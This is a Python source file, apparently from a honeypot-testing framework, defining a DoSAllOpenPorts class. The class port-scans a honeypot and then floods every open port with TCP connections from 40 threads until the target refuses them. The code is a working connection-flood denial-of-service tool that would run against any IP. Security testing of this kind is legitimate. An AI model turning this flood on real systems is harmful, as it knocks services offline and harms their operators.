import time
import socket
import threading
from .base_attack import BaseAttack
from .honeypot_port_scanner.honeypot_port_scanner import HoneypotPortScanner

class DoSAllOpenPorts(BaseAttack):
    def __init__(self, honeypot):
        super().__init__(honeypot)
        self.honeypot_ports = []
        # dionaea ports found with nmap
        # self.honeypot_ports = ['21', '42', '80', '135', '443', '445', '1433', '1723', '3306', '5000', '5060', '5061', '7000'] 
        self.honeypot_rejecting_connections = False

    def run_HoneypotPortScanner(self):
        """
        Run the HoneypotPortScanner to get the open ports of the honeypot.
        """
        honeypot_scanner = HoneypotPortScanner(self.honeypot.ip)
        honeypot_scanner.run_scanner()
        self.honeypot_ports = honeypot_scanner.get_open_ports()

    def attack(self, stop_event):
        """
        Attempt to flood the honeypot with connections in all ports, until it starts rejecting them.
        """
        try:
            while not self.honeypot_rejecting_connections and not stop_event.is_set():
                for port in self.honeypot_ports:
                    port = int(port)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    try:
                        print(f"Connecting to {self.honeypot.ip}:{port}...")
                        sock.connect((self.honeypot.ip, port))
                    except Exception as e:
                        print(f"Exception occurred: {e}")
                        self.honeypot_rejecting_connections = True
                        break
                    finally:
                        sock.close()
                time.sleep(0.01)
        except Exception as ex:
            print(f"Exception in thread: {ex}")


    def run_attack(self, num_threads=40):
        """
        Launch the DoS attack using multiple threads.
        """
        print(f"Running the nmap scanner...")
        self.run_HoneypotPortScanner()
        # print(f"Skipping the nmap scanner...")
        print(f"Running DoS attack on {self.honeypot.ip} and ports: {self.honeypot_ports}...")
        self.honeypot_rejecting_connections = False
        stop_event = threading.Event()  # Event to signal threads to stop

        threads = [threading.Thread(target=self.attack, args=(stop_event,)) for _ in range(num_threads)]

        start_time = time.time()

        for thread in threads:
            thread.start()

        # Wait for a certain duration or until the event is set
        time.sleep(10)  # Adjust the duration as needed
        stop_event.set()  # Signal threads to stop

        for thread in threads:
            thread.join()

        end_time = time.time()
        time_taken = end_time - start_time

        # Check if honeypot successfully rejected connections
        if self.honeypot_rejecting_connections:
            return True, "Vulnerability found: DoS attack made the honeypot reject connections", time_taken, num_threads
        else:
            return False, "Honeypot did not reject connections, attack unsuccessful", time_taken, num_threads

